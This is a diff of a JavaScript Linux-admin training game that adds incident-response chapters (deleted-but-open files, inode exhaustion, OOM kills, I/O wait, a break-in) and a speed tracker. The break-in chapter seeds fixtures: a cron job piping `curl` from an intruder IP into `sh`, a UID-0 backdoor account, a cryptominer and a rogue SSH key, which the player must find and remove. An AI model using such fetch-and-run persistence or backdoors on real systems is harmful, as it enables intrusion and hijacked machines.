   grep: ['print lines that match a pattern', 'grep [OPTION]... PATTERN [FILE]...', [['-i', 'ignore case'], ['-v', 'print lines that do NOT match'], ['-c', 'print only a count of matching lines'], ['-n', 'show line numbers'], ['-r', 'search every file under a directory'], ['-l', 'print only the names of files that match'], ['-L', 'print only the names of files that do not match'], ['-o', 'print only the matching part'], ['-w', 'match whole words only'], ['-h / -H', 'hide / show file names'], ['-E', 'extended regular expressions (+ ? | () work)'], ['-F', 'treat the pattern as plain text'], ['-e PATTERN', 'use PATTERN (useful if it starts with -)']], ['grep ERROR app.log', 'grep -c ERROR app.log', 'grep -ri "disk" /var/log/halcyon']],
   sort: ['sort lines of text', 'sort [OPTION]... [FILE]...', [['-n', 'compare as numbers'], ['-r', 'reverse the order'], ['-u', 'drop duplicate lines'], ['-k N', 'sort by field N (fields are separated by spaces)'], ['-t C', 'use C as the field separator'], ['-f', 'ignore case'], ['-h', 'compare sizes like 2K, 1G']], ['sort names.txt', 'sort -rn counts.txt', 'sort -t: -k3 -n /etc/passwd']],
   uniq: ['collapse repeated lines', 'uniq [OPTION]... [FILE]', [['-c', 'prefix each line with how many times it repeated'], ['-d', 'only print lines that repeat'], ['-u', 'only print lines that do not repeat'], ['-i', 'ignore case']], ['sort ips.txt | uniq -c'], 'uniq only collapses repeats that sit next to each other. Run sort first.'],
@@ -3272,6 +3393,8 @@ const MAN = {
   watch: ['run a command repeatedly and watch its output', 'watch [-n SECONDS] COMMAND', [['-n N', 'rerun every N seconds']], ['watch -n 2 systemctl status halcyon'], 'In this game it runs the command once.'],
   make: ['run the recipes in a Makefile', 'make [TARGET]', [['-n', 'dry run: print the commands without running them']], ['make backup', 'make deploy'], 'A Makefile names targets, each with tab-indented commands. `make TARGET` runs that target\'s commands.'],
   hint: ['game: reveal the next hint for this ticket', 'hint', [], ['hint'], 'Each hint lowers this ticket\'s reward by 25 XP (minimum 25).'],
+  tracker: ['game: turn the optional speed tracker on or off', 'tracker', [], ['tracker'], 'When on, each ticket is timed and the time (and hints used) is logged. Toggle it with the Speed tracker button in the header too. Your log is kept when you turn it off.'],
+  stats: ['game: show your speed-tracker log', 'stats', [], ['stats'], 'Prints the time you took on each resolved ticket, plus totals, average, fastest and slowest. Only records while the tracker is on.'],
   submit: ['game: answer a question ticket', 'submit ANSWER', [], ['submit 42', 'submit 03:47:12']],
   retry: ['game: restore the server to how it was when this ticket opened', 'retry', [], ['retry']]
 };
@@ -3318,7 +3441,12 @@ const CHAPTERS = [
   { label: 'Chapter 27', name: 'Signals & Long Jobs', topic: 'Processes, deeper' },
   { label: 'Chapter 28', name: 'See Everything', topic: 'Observability' },
   { label: 'Chapter 29', name: 'Make It Repeatable', topic: 'Automation' },
-  { label: 'Chapter 30', name: 'From Zero', topic: 'Provision a service (capstone)' }
+  { label: 'Chapter 30', name: 'From Zero', topic: 'Provision a service (capstone)' },
+  { label: 'Chapter 31', name: 'Incident File: The Phantom Disk', topic: 'Deleted-but-open files' },
+  { label: 'Chapter 32', name: 'Incident File: No Space, Plenty of Room', topic: 'Inode exhaustion' },
+  { label: 'Chapter 33', name: 'Incident File: Someone Else Is Root', topic: 'Compromise & privesc' },
+  { label: 'Chapter 34', name: 'Incident File: The Service That Keeps Dying', topic: 'The OOM killer' },
+  { label: 'Chapter 35', name: 'Incident File: The Ghost Load', topic: 'I/O wait & stuck processes' }
 ];
 CHAPTERS[0].outro = "**Chapter 1 complete.** You know where everything lives. Now the clean-up.";
 CHAPTERS[1].outro = "**Chapter 2 complete.** The disk has room again and the script is out of the public folder. Time to find out what really happened.";
@@ -3350,7 +3478,12 @@ CHAPTERS[26].outro = "**Chapter 27 complete.** You found what held a port with l
 CHAPTERS[27].outro = "**Chapter 28 complete.** vmstat and iostat for a live view, and a health-check script of your own, scheduled to run. You cannot keep a server healthy if you cannot see it.";
 CHAPTERS[28].outro = "**Chapter 29 complete.** A Makefile turned your deploy and backup steps into named targets anyone can run. Automation is just writing down what you already do, so it happens the same way every time.";
 CHAPTERS[29].outro = "**Chapter 30 complete.** You built a brand-new service from nothing \u2014 account, script, unit, timer, firewall rule, backup, deploy \u2014 with no story to hand it to you. That is the whole job, start to finish, in your hands.";
-const FINALE = { title: 'Legend of Halcyon', story: "Thirty chapters ago this box went down at 3am with a full disk and a secret, and you did not know whoami. You fixed the crash, closed the leak, locked the accounts, hardened the doors, automated the backups, scheduled them with systemd, read the traffic, rotated the logs, containerised the release, shipped it under version control, and did it all again under pressure. Then you went deeper \u2014 regex and DNS, the kernel and the shell, ACLs and LVM, signals and observability, automation \u2014 and finally built a whole new service from zero. Dana left you a broken server and a warning. You became the person the next Dana hopes answers the page.", next: 'You have reached the end', nextText: "Thirty chapters, 150-plus tickets, from `whoami` to provisioning a service from scratch. There is nothing left to teach you here \u2014 the sandbox, and every command in it, is yours." };
+CHAPTERS[30].outro = "**Chapter 31 complete.** `df` said the disk was full; `du` said it wasn't. The gap was a log file someone deleted while the service still held it open — `lsof +L1` named the culprit, and restarting the service freed the space for real. First rule of a phantom disk: a deleted file is not gone until nothing has it open.";
+CHAPTERS[31].outro = "**Chapter 32 complete.** 'No space left on device' with gigabytes free is almost always inodes, not bytes. `df -i` proved it, `du --inodes` found the million tiny session files, and a targeted `find ... -delete` cleared them. You now read two kinds of 'full'.";
+CHAPTERS[32].outro = "**Chapter 33 complete.** A UID-0 account nobody created, a miner pegging a core, a rogue cron for persistence, and a key in someone's authorized_keys — you found the intruder's footprint, killed the process, pulled the account, cut the cron, and blocked the address. This is the one you hope you never see.";
+CHAPTERS[33].outro = "**Chapter 34 complete.** The app wasn't crashing — the kernel was executing it. An out-of-memory system kills the biggest target to save itself, and it leaves its reasons in `dmesg` and the journal. You read the verdict, confirmed the victim, and brought the service back.";
+CHAPTERS[34].outro = "**Chapter 35 complete.** Load average in the double digits, CPU almost idle: the machine was waiting on disk, not working. One process stuck in uninterruptible sleep (`D`) was dragging a backup across a slow mount. `iostat` showed the saturation, and you cleared the stuck job. The last incident file is closed.";
+const FINALE = { title: 'Chief Incident Commander', story: "Thirty chapters ago this box went down at 3am with a full disk and a secret, and you did not know whoami. You fixed the crash, closed the leak, locked the accounts, hardened the doors, automated the backups, scheduled them with systemd, read the traffic, rotated the logs, containerised the release, shipped it under version control, and did it all again under pressure. Then you went deeper \u2014 regex and DNS, the kernel and the shell, ACLs and LVM, signals and observability, automation \u2014 and finally built a whole new service from zero. Then came the incident files \u2014 the phantom disk, the inode flood, the intruder who was already root, the service the kernel kept killing, the ghost load that was really a stuck disk \u2014 the pages that wake real admins at 3am, and you worked every one of them to a clean close. Dana left you a broken server and a warning. You became the person the next Dana hopes answers the page.", next: 'You have reached the end', nextText: "Thirty-five chapters, 180-plus tickets, from `whoami` to commanding an incident. There is nothing left to teach you here \u2014 the sandbox, and every command in it, is yours." };
 const P = {
   handover: HOME + '/.handover.txt', readme: '/srv/halcyon/README',
   conf: '/srv/halcyon/releases/v2.3.1/config/app.conf', oldconf: '/srv/halcyon/releases/v2.2.0/config/app.conf',
@@ -4213,7 +4346,184 @@ const MISSIONS = [
     story: "The reports service is accounted for, scheduled, firewalled, and backed up. You built it from zero. Write the runbook entry for it and close the book \u2014 you are the admin on call now.",
     objective: 'Write a short runbook note to `~/incident/REPORTS.md` describing the new service.',
     hints: ['`echo "text" > file` writes it. Describe what reportsvc is and how it runs.', 'Anything real counts, as long as the file has content.', 'Run `echo "# reports service: runs report.sh via report-gen.timer as reportsvc, port 9100, backed up to /mnt/backups." > ~/incident/REPORTS.md`.'],
-    check: () => { const n = getNode(HOME + '/incident/REPORTS.md'); return !!n && n.type === 'file' && n.content.trim().length > 15; } }
+    check: () => { const n = getNode(HOME + '/incident/REPORTS.md'); return !!n && n.type === 'file' && n.content.trim().length > 15; } },
+
+  /* ============ Chapter 31 — Incident File: The Phantom Disk ============ */
+  { ch: 30, id: 'ph-df', title: 'PAGE: disk full, service failing',
+    story: "3:02am page: halcyon is throwing write errors and the disk alarm is red. You log in cold. Before you touch anything, read the situation. How full is the root filesystem? This is the same `df -h` you first ran back in Chapter 2 — only now it's an emergency.",
+    objective: 'Check free space on the root filesystem. What percent is `/` used? Answer with `submit NUMBER` (just the number).',
+    hints: ['`df -h` reports free space per filesystem. Read the Use% column for the row mounted on `/`.', 'Give just the number, no percent sign.', 'Run `df -h`, read the `/` row’s Use%, then `submit 100`.'],
+    onStart: () => { S.held = 6442450944; S.heldPid = 812; S.inodeBad = false; S.oom = null; S.iowait = false; S.compromise = false; },
+    answer: a => { const n = a.trim().replace('%', ''); return n === '100' || n === '99'; } },
+  { ch: 30, id: 'ph-du', title: 'But where did it go?',
+    story: "`df` says the disk is full. The natural next move: add up what's actually on it with `du` and find the hog. Total the root filesystem (ignore the permission-denied noise) — you'll find the numbers don't agree with `df`. That disagreement is the whole case.",
+    objective: 'Add up real usage with `du -sh /` (as root). Does `du` account for all the space `df` says is used? Answer `submit yes` or `submit no`.',
+    hints: ['`sudo du -sh /` totals everything on disk. Compare it to the ~6G `df` claims is used.', '`du` only counts files that still have a name. If a big chunk is missing, the space is held by something with no name left.', 'The totals don’t match — `submit no`.'],
+    answer: a => /^n/i.test(a.trim()) },
+  { ch: 30, id: 'ph-lsof', title: 'Deleted, but not freed',
+    story: "Space that `df` counts but `du` can't see almost always means a deleted file that a running process still holds open — the space isn't released until that process lets go. `lsof +L1` lists open files whose link count has dropped to zero: files that were `rm`'d while still open.",
+    objective: 'Find the deleted-but-open file. Which PID is still holding it? Answer with `submit PID`.',
+    hints: ['`sudo lsof +L1` lists open files with a link count of 0 (NLINK column). These are deleted files still held open.', 'Read the PID column of the row whose NAME ends with `(deleted)`.', 'Run `sudo lsof +L1`. The holder is PID 812.'],
+    answer: a => a.trim() === '812' },
+  { ch: 30, id: 'ph-path', title: 'Name the file',
+    story: "You have the PID. Name the deleted file it's holding — that tells you what to stop logging to, and confirms this is a logging mistake, not an attack. The path is in the same `lsof +L1` output.",
+    objective: 'What is the full path of the deleted file being held open? Answer with `submit PATH`.',
+    hints: ['Read the NAME column of the `+L1` row — it shows the original path with `(deleted)` after it.', 'Give the path only, without the `(deleted)` marker.', 'Run `sudo lsof +L1`. It is `/var/log/halcyon/debug.log`.'],
+    answer: a => a.trim().replace(/\s*\(deleted\)\s*$/, '') === '/var/log/halcyon/debug.log' },
+  { ch: 30, id: 'ph-fix', title: 'Give the space back',
+    story: "You can't `rm` your way out — the file is already deleted; the process just won't let go. The clean fix is to make the holder release its file handle. Restarting the service does exactly that (the real-world alternative, truncating the fd via `/proc`, is beyond this sandbox). Restart halcyon and watch the space come back.",
+    objective: 'Restart the halcyon service so it releases the deleted file, then confirm `/` is no longer full.',
+    hints: ['`sudo systemctl restart halcyon` makes the process close its open files, freeing the space.', 'After it restarts, run `df -h` — the `/` row should drop well below full.', 'Run `sudo systemctl restart halcyon`, then `df -h`.'],
+    check: () => (S.held || 0) === 0 && S.restarted && S.restarted['halcyon'],
+    nudge: () => "The space is still held. Restart the service that owns the file: `sudo systemctl restart halcyon`." },
+
+  /* ============ Chapter 32 — Incident File: No Space, Plenty of Room ============ */
+  { ch: 31, id: 'in-df', title: 'PAGE: cannot write, but df looks fine',
+    story: "New page: the app logs `No space left on device`, yet the dashboard swears the disk is only 15% full. Both can be true at once. Start where you always do — `df -h` — and confirm the bytes really are fine.",
+    objective: 'Check `df -h`. Is the root filesystem out of space (bytes)? Answer `submit yes` or `submit no`.',
+    hints: ['`df -h` shows space used in bytes. The `/` row is comfortable.', 'If bytes are fine but writes fail, the filesystem is out of something else.', 'Bytes are fine — `submit no`.'],
+    onStart: () => { S.held = 0; S.heldPid = null; S.inodeBad = true; S.oom = null; S.iowait = false; S.compromise = false; },
+    answer: a => /^n/i.test(a.trim()) },
+  { ch: 31, id: 'in-dfi', title: 'The other kind of full',
+    story: "Every file needs an inode — a slot in the filesystem's table of files. You can run out of inodes with gigabytes of bytes still free, usually from millions of tiny files. `df -i` reports inodes instead of bytes. This is the flag that cracks the case.",
+    objective: 'Run `df -i`. What percent of inodes on `/` are used? Answer with `submit NUMBER`.',
+    hints: ['`df -i /` shows inode usage. Read the IUse% column.', 'Give just the number, no percent sign.', 'Run `df -i /`, then `submit 100`.'],
+    answer: a => { const n = a.trim().replace('%', ''); return n === '100' || n === '99'; } },
+  { ch: 31, id: 'in-du', title: 'Find the swarm',
+    story: "Inodes are exhausted, so somewhere a directory is full of tiny files. `du --inodes` counts files instead of bytes — point it at the usual suspects (session dirs, mail spools, cache) and find the swarm.",
+    objective: 'Use `du --inodes` to find the directory holding ~a million files. Which directory is it? Answer with `submit PATH`.',
+    hints: ['`sudo du --inodes /var` counts files per directory under /var.', 'One directory holds over a million entries — PHP session files that were never cleaned up.', 'Run `sudo du --inodes /var`. It is `/var/lib/php/sessions`.'],
+    answer: a => a.trim().replace(/\/$/, '') === '/var/lib/php/sessions' },
+  { ch: 31, id: 'in-clean', title: 'Clear the old files',
+    story: "Don't blow the whole directory away — some sessions may be live. Delete only the stale ones: files older than 7 days. `find` with `-mtime +7 -delete` does exactly that (the safe, surgical version of what you learned in Chapter 1).",
+    objective: 'Delete files older than 7 days from the session directory, then confirm inodes are freed.',
+    hints: ['`sudo find /var/lib/php/sessions -type f -mtime +7 -delete` removes only the stale files.', 'List them first without `-delete` if you want to see what will go.', 'Run the find with `-delete`, then `df -i /` to confirm IUse% dropped.'],
+    check: () => !S.inodeBad,
+    nudge: () => "Inodes are still full. Remove the stale session files: `sudo find /var/lib/php/sessions -type f -mtime +7 -delete`." },
+  { ch: 31, id: 'in-prevent', title: 'Stop it recurring',
+    story: "A one-time cleanup that you have to remember is a future 3am page. The real fix is to make it automatic. Drop a cleanup job into `/etc/cron.d` so the swarm never builds up again — the cron skills from Chapters 5 and 29, applied to prevention.",
+    objective: 'Create `/etc/cron.d/php-session-clean` with a daily job that purges old session files.',
+    hints: ['A /etc/cron.d file has a 6-field line: `m h dom mon dow user command`. Use root as the user.', 'Write it with sudo + tee, e.g. the find command you just ran, once a day.', 'Run: `echo \"30 3 * * * root find /var/lib/php/sessions -type f -mtime +7 -delete\" | sudo tee /etc/cron.d/php-session-clean`.'],
+    check: () => { const n = getNode('/etc/cron.d/php-session-clean'); return !!n && n.type === 'file' && /find/.test(n.content) && /sessions/.test(n.content); },
+    nudge: () => "Add a cron.d job that runs the cleanup daily, e.g. `echo \"30 3 * * * root find /var/lib/php/sessions -type f -mtime +7 -delete\" | sudo tee /etc/cron.d/php-session-clean`." },
+
+  /* ============ Chapter 33 — Incident File: Someone Else Is Root ============ */
+  { ch: 32, id: 'co-w', title: 'PAGE: unknown login, box running hot',
+    story: "The monitoring bot pages: sustained 100% CPU on one core and an SSH login from an address no one recognises. This is the page you hope you never get. Work it calmly and in order. First: who is on the box right now? `w` and `last` show current and recent logins.",
+    objective: 'Check who is logged in and from where. What IP does the unknown session come from? Answer with `submit IP`.',
+    hints: ['`w` shows active sessions with their source in the FROM column; `last` shows recent logins.', 'One session isn’t yours and isn’t from the office range (10.0.x). Read its address.', 'Run `w` (or `last`). The intruder IP is 198.51.100.66.'],
+    onStart: () => {
+      S.held = 0; S.heldPid = null; S.inodeBad = false; S.oom = null; S.iowait = false; S.compromise = true; S.intruderIp = '198.51.100.66';
+      const pw = getNode('/etc/passwd'); if (pw && !/\nsupport:/.test('\n' + pw.content)) pw.content = pw.content.replace(/\n?$/, '\n') + 'support:x:0:0:Support:/root:/bin/bash\n';
+      const sh = getNode('/etc/shadow'); if (sh && !/\nsupport:/.test('\n' + sh.content)) sh.content = sh.content.replace(/\n?$/, '\n') + 'support:$6$abc$3b7f.rogue.hash.x9:20010:0:99999:7:::\n';
+      if (!S.procs.find(p => p.pid === 6713)) S.procs.push({ pid: 6713, user: 'www-data', cpu: 196.4, mem: 1.2, vsz: 442100, rss: 51200, tty: '?', stat: 'Rsl', start: '03:11', time: '184:06', cmd: '/tmp/.cache/kdevtmpfsi -o pool.minexmr.com:4444' });
+      const tmp = getNode('/tmp'); if (tmp && !tmp.children['.cache']) tmp.children['.cache'] = D({ 'kdevtmpfsi': F('#!/bin/sh\n# miner\n', { owner: 'www-data', mode: 0o755 }), '.run': F('pool.minexmr.com:4444\n', { owner: 'www-data' }) }, { owner: 'www-data' });
+      const crond = getNode('/etc/cron.d'); if (crond && !crond.children['apache2-munin']) crond.children['apache2-munin'] = F('* * * * * www-data curl -s http://198.51.100.66/x.sh | sh\n', { owner: 'root', mode: 0o644 });
+      const jm = getNode('/home/jmorrow'); if (jm) { if (!jm.children['.ssh']) jm.children['.ssh'] = D({}, { owner: 'jmorrow', mode: 0o700 }); const ak = jm.children['.ssh'].children['authorized_keys']; const rogue = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAArogueKEYdonotTRUSTxx attacker@evil\n'; if (ak) { if (!/attacker@evil/.test(ak.content)) ak.content += rogue; } else jm.children['.ssh'].children['authorized_keys'] = F(rogue, { owner: 'jmorrow', mode: 0o600 }); }
+    },
+    answer: a => a.trim() === '198.51.100.66' },
+  { ch: 32, id: 'co-uid0', title: 'An account that should not exist',
+    story: "An attacker who reaches root usually leaves a way back in. The classic backdoor is a second account with UID 0 — root's power under a different name. Any account with UID 0 besides `root` is a red flag. `awk` on /etc/passwd finds them (Chapters 4 and 21).",
+    objective: 'Find every UID-0 account. Which one does not belong? Answer with `submit NAME`.',
+    hints: ['Field 3 of /etc/passwd is the UID. `awk -F: \u0027$3==0{print $1}\u0027 /etc/passwd` lists UID-0 accounts.', 'root belongs. The other one does not.', 'Run `awk -F: \u0027$3==0{print $1}\u0027 /etc/passwd`. The rogue account is `support`.'],
+    answer: a => a.trim() === 'support' },
+  { ch: 32, id: 'co-proc', title: 'What is eating the CPU',
+    story: "Now the process pegging that core. Attackers who get in to make money almost always drop a cryptominer. Find the top CPU consumer with `ps`/`top` (Chapters 5 and 17) and note its PID — also note it's running as `www-data` and hiding in `/tmp`.",
+    objective: 'Find the runaway process. What is its PID? Answer with `submit PID`.',
+    hints: ['`ps aux --sort=-%cpu | head` or `top` puts the busiest process on top.', 'It runs from /tmp/.cache and uses nearly 200% CPU.', 'The miner is PID 6713.'],
+    answer: a => a.trim() === '6713' },
+  { ch: 32, id: 'co-kill', title: 'Kill the miner',
+    story: "You have identified it. Stop it. Kill the miner process so it stops burning CPU and phoning home. (On a real box you'd also quarantine the binary for forensics; here, stopping it is the fix.)",
+    objective: 'Kill process 6713.',
+    hints: ['`sudo kill 6713` stops it. If it refuses to die, `sudo kill -9 6713`.', 'Confirm with `ps aux | grep kdevtmpfsi` — it should be gone.', 'Run `sudo kill 6713`.'],
+    check: () => !S.procs.find(p => p.pid === 6713),
+    nudge: () => "The miner is still running. Stop it: `sudo kill 6713`." },
+  { ch: 32, id: 'co-cron', title: 'Cut the persistence',
+    story: "Kill the process and it'll come back if the attacker left a way to relaunch it. Look in `/etc/cron.d` for a job you didn't write — that's how it respawns. Remove it to break persistence.",
+    objective: 'Find and remove the malicious cron job in `/etc/cron.d`.',
+    hints: ['`ls /etc/cron.d` and `cat` the entries. One fetches a script from the intruder IP and pipes it to a shell.', 'That file is the persistence mechanism. Delete it.', 'Run `sudo rm /etc/cron.d/apache2-munin`.'],
+    check: () => !getNode('/etc/cron.d/apache2-munin'),
+    nudge: () => "The rogue cron is still there. Remove it: `sudo rm /etc/cron.d/apache2-munin`." },
+  { ch: 32, id: 'co-lock', title: 'Lock them out',
+    story: "Last: shut the door. Delete the backdoor UID-0 account so the attacker loses their foothold, and block the source address at the firewall so they can't simply reconnect. Account removal from Chapter 18, firewall rules from Chapter 6.",
+    objective: 'Delete the `support` account and block the intruder IP at the firewall.',
+    hints: ['`sudo userdel support` removes the account. `sudo ufw deny from 198.51.100.66` blocks the address.', 'You can also revoke the rogue SSH key in jmorrow’s authorized_keys, but the account and firewall are the graded fix.', 'Run `sudo userdel support`, then `sudo ufw deny from 198.51.100.66`.'],
+    check: () => { const pw = getNode('/etc/passwd'); const noSupport = pw && !/^support:/m.test(pw.content); const blocked = S.firewall && S.firewall.rules && S.firewall.rules.some(r => (r.action === 'deny' || /deny/i.test(r.action || '')) && JSON.stringify(r).includes('198.51.100.66')); return !!noSupport && !!blocked; },
+    nudge: () => "Both parts must be done: `sudo userdel support` and `sudo ufw deny from 198.51.100.66`." },
+
+  /* ============ Chapter 34 — Incident File: The Service That Keeps Dying ============ */
+  { ch: 33, id: 'oom-status', title: 'PAGE: halcyon keeps dying',
+    story: "halcyon has restarted three times in an hour and is down again. The app log shows no crash, no stack trace — it just stops mid-request. When an app dies with no error of its own, suspect something outside it. Start with the service state (Chapter 12/16).",
+    objective: 'Check the halcyon service. Is it currently active? Answer `submit yes` or `submit no`.',
+    hints: ['`systemctl status halcyon` shows whether it is running and why it stopped.', 'Read the Active: line.', 'It is not running — `submit no`.'],
+    onStart: () => {
+      S.held = 0; S.heldPid = null; S.inodeBad = false; S.oom = 812; S.iowait = false; S.compromise = false;
+      S.procs = S.procs.filter(p => p.pid < 812 || p.pid > 816);
+      if (S.services.halcyon) { S.services.halcyon.active = false; S.services.halcyon.since = 'inactive (dead)'; }
+      if (S.restarted) delete S.restarted['halcyon'];
+      S.journal.halcyon = [
+        'Oct 28 02:14:51 halcyon-web01 systemd[1]: Started halcyon.service - Halcyon Freight web app.',
+        'Oct 28 02:48:03 halcyon-web01 halcyon-worker[812]: handling batch export (18422 rows)',
+        'Oct 28 02:48:19 halcyon-web01 kernel: Out of memory: Killed process 812 (halcyon-worker)',
+        'Oct 28 02:48:19 halcyon-web01 systemd[1]: halcyon.service: A process of this unit has been killed by the OOM killer.',
+        'Oct 28 02:48:19 halcyon-web01 systemd[1]: halcyon.service: Failed with result \u0027oom-kill\u0027.',
+        'Oct 28 02:48:20 halcyon-web01 systemd[1]: halcyon.service: Consumed 3.0G memory.'
+      ];
+    },
+    answer: a => /^n/i.test(a.trim()) },
+  { ch: 33, id: 'oom-journal', title: 'Who stopped it?',
+    story: "The service didn't exit on its own — something stopped it. The journal records why systemd units die. Read halcyon's journal and find the verdict. One line names the killer.",
+    objective: 'Read the halcyon journal. What killed the process? Answer with `submit WORD` (one word for the mechanism).',
+    hints: ['`journalctl -u halcyon` shows the unit’s log. Look near the last restart.', 'A kernel subsystem that frees memory by killing a process — two words joined, often written “OOM”.', 'Run `journalctl -u halcyon`. The answer is the OOM killer — `submit oom`.'],
+    answer: a => /\boom\b/i.test(a.trim()) || /out.?of.?memory/i.test(a.trim()) },
+  { ch: 33, id: 'oom-dmesg', title: 'Confirm it in the kernel ring',
+    story: "The OOM killer lives in the kernel, and it logs its decisions to the kernel ring buffer. `dmesg` reads it. Confirm the kill there and note which PID the kernel chose as its victim — the biggest memory user, usually.",
+    objective: 'Find the OOM kill in `dmesg`. Which PID did the kernel kill? Answer with `submit PID`.',
+    hints: ['`sudo dmesg | grep -i oom` filters to the OOM lines. (Chapters 3 and 23.)', 'The line reads `Killed process NNN (halcyon-worker)`.', 'Run `sudo dmesg | grep -i oom`. The victim is PID 812.'],
+    answer: a => a.trim() === '812' },
+  { ch: 33, id: 'oom-free', title: 'How tight is memory?',
+    story: "Before bringing it back, understand how close to the edge this box runs. `free -h` shows total, used and available memory. A server with no headroom will OOM again under the next big batch — that's the follow-up ticket for the capacity team, but first see the numbers.",
+    objective: 'Show memory usage with `free -h`.',
+    hints: ['Run `free -h`. The `available` column is what matters — memory the system can give out without swapping.', 'This box has very little headroom, which is why a big export tipped it over.', 'Run `free -h`.'],
+    check: () => S.cmdsM.includes('free') },
+  { ch: 33, id: 'oom-fix', title: 'Bring it back',
+    story: "You've confirmed root cause: a memory spike from a large batch, not a bug in the app. Restart the service to restore it now; the lasting fix (a memory limit on the unit, or more RAM) goes to the capacity backlog. Restart halcyon and confirm it's running.",
+    objective: 'Restart the halcyon service and confirm it is active again.',
+    hints: ['`sudo systemctl restart halcyon` starts it. `systemctl is-active halcyon` should then say `active`.', 'A `MemoryMax=` in the unit file would cap it next time — note that for the backlog.', 'Run `sudo systemctl restart halcyon`, then `systemctl is-active halcyon`.'],
+    check: () => S.services.halcyon && S.services.halcyon.active && S.restarted && S.restarted['halcyon'],
+    nudge: () => "halcyon is still down. Restart it: `sudo systemctl restart halcyon`." },
+
+  /* ============ Chapter 35 — Incident File: The Ghost Load ============ */
+  { ch: 34, id: 'gl-uptime', title: 'PAGE: load average through the roof',
+    story: "Final incident file. The box is “slow” and the load average alarm is screaming — but users say some things are fine. Load average counts processes waiting to run OR waiting on I/O, so a high number doesn't always mean a busy CPU. Read the load first (Chapters 16 and 28).",
+    objective: 'Check the load average with `uptime`. Is the 1-minute load high (above ~10)? Answer `submit yes` or `submit no`.',
+    hints: ['`uptime` ends with `load average: 1min, 5min, 15min`.', 'The first number is well into double digits.', 'Load is high — `submit yes`.'],
+    onStart: () => {
+      S.held = 0; S.heldPid = null; S.inodeBad = false; S.oom = null; S.compromise = false; S.iowait = true;
+      if (!S.procs.find(p => p.pid === 5120)) S.procs.push({ pid: 5120, user: 'root', cpu: 2.1, mem: 0.6, vsz: 38200, rss: 15400, tty: '?', stat: 'D', start: '02:30', time: '0:44', cmd: '/usr/bin/rsync -a /srv/halcyon /mnt/backups/mirror' });
+    },
+    answer: a => /^y/i.test(a.trim()) },
+  { ch: 34, id: 'gl-vmstat', title: 'Busy, or waiting?',
+    story: "High load but is the CPU actually working? `vmstat` splits CPU time into user, system, idle and — crucially — `wa`, the percent of time spent waiting on I/O. A high `wa` with low `us`/`sy` means the machine is stuck waiting on disk, not computing.",
+    objective: 'Run `vmstat`. Is the CPU mostly busy (us+sy high) or mostly waiting on I/O (wa high)? Answer `submit cpu` or `submit io`.',
+    hints: ['`vmstat` — read the `us`, `sy`, `id` and `wa` columns on the data row.', '`wa` is in the 80s; `us`+`sy` are single digits. That is an I/O problem.', 'Run `vmstat`. The answer is `io` (also accepts `iowait`/`wait`).'],
+    answer: a => /^(io|iowait|wait|wa|i\/o|disk)/i.test(a.trim()) },
+  { ch: 34, id: 'gl-proc', title: 'Find the stuck process',
+    story: "A process waiting on I/O sits in state `D` — uninterruptible sleep. Those are the ones dragging the load up. `ps` shows process state in the STAT column; filter for `D` with awk (Chapters 5 and 21) and get the PID.",
+    objective: 'Find the process in `D` (uninterruptible sleep) state. What is its PID? Answer with `submit PID`.',
+    hints: ['`ps aux` — column 8 (STAT) shows state. `ps aux | awk \u0027$8 ~ /D/ {print $2, $11}\u0027` prints PID and command of D-state procs.', 'It is an rsync copying to a slow backup mount.', 'Run that awk. The PID is 5120.'],
+    answer: a => a.trim() === '5120' },
+  { ch: 34, id: 'gl-iostat', title: 'Which disk is saturated?',
+    story: "Confirm the bottleneck is disk, and see which one. `iostat` breaks activity down per device; the saturated device shows a high `tps` and transfer rate. That names the slow mount the rsync is hammering.",
+    objective: 'Run `iostat`. Which device is doing nearly all the I/O? Answer with `submit DEVICE` (e.g. the device name).',
+    hints: ['`iostat` lists devices with tps and kB/s. One row dwarfs the rest.', 'It is the root/primary virtio disk.', 'Run `iostat`. The device is `vda1` (also accepts `vda`).'],
+    answer: a => { const d = a.trim().replace('/dev/', ''); return d === 'vda1' || d === 'vda'; } },
+  { ch: 34, id: 'gl-fix', title: 'Clear the ghost load',
+    story: "Root cause: a backup rsync stuck on a slow mount, piling up I/O wait and inflating the load while the CPU sat idle. Stop the stuck job to clear the load now; rescheduling the backup to an off-peak window and a faster target is the follow-up. Kill PID 5120 and watch the load fall.",
+    objective: 'Kill the stuck rsync (PID 5120), then confirm it is gone.',
+    hints: ['`sudo kill 5120`. A `D`-state process may not die instantly — give it a moment, then re-check with `ps`.', 'Once it clears, `uptime` and `vmstat wa` will fall back to normal.', 'Run `sudo kill 5120`, then `ps aux | grep rsync`.'],
+    check: () => !S.procs.find(p => p.pid === 5120),
+    nudge: () => "The stuck rsync is still there. Stop it: `sudo kill 5120`." },
 ];
 function findSync() {
   const q = getNode(P.quar + '/sync_out.sh');
@@ -4267,10 +4577,60 @@ function afterCommand() {
   if (m.check && m.check()) completeMission();
 }
 const rewardFor = m => Math.max(25, 100 - 25 * (S.hints[m.id] || 0));
+function fmtDur(ms) {
+  const t = Math.max(0, Math.round(ms / 1000));
+  const h = Math.floor(t / 3600), m = Math.floor((t % 3600) / 60), sec = t % 60;
+  return h ? `${h}:${pad(m)}:${pad(sec)}` : `${m}:${pad(sec)}`;
+}
+function trackerOn() { return !!S.tracker; }
+function trackStart() { if (S.tracker && !S.finished) S.missionStart = Date.now(); }
+let clockIv = null;
+function tickClock() {
+  const el = $('#clock');
+  if (!el) return;
+  if (S.tracker && !S.finished && S.missionStart) { const d = fmtDur(Date.now() - S.missionStart); el.textContent = d; const live = $('#spdLive'); if (live) live.textContent = d; }
+}
+function ensureClock() {
+  if (clockIv) return;
+  clockIv = setInterval(tickClock, 1000);
+}
+function toggleTracker() {
+  S.tracker = !S.tracker;
+  if (S.tracker) { S.times = S.times || []; S.missionStart = Date.now(); emitSys('<b>Speed tracker on.</b> This ticket is being timed; each ticket you resolve from now is logged. Type <code>stats</code> to see your times, or <code>tracker</code> to turn it off.', 'ok'); }
+  else { S.missionStart = null; emitSys('Speed tracker off. Your log is kept — turn it back on any time with <code>tracker</code>.', 'hint'); }
+  render(); save();
+}
+function statsLog(ctx) {
+  const times = S.times || [];
+  if (!S.tracker && !times.length) { if (ctx) ctx.out('The speed tracker is off and no tickets have been timed yet.\nTurn it on with: tracker\n'); return; }
+  if (!times.length) { if (ctx) ctx.out('Speed tracker is on, but no tickets have been resolved yet. The clock is running on the current ticket.\n'); return; }
+  const total = times.reduce((a, r) => a + r.ms, 0);
+  const avg = total / times.length;
+  const fastest = times.reduce((a, r) => r.ms < a.ms ? r : a);
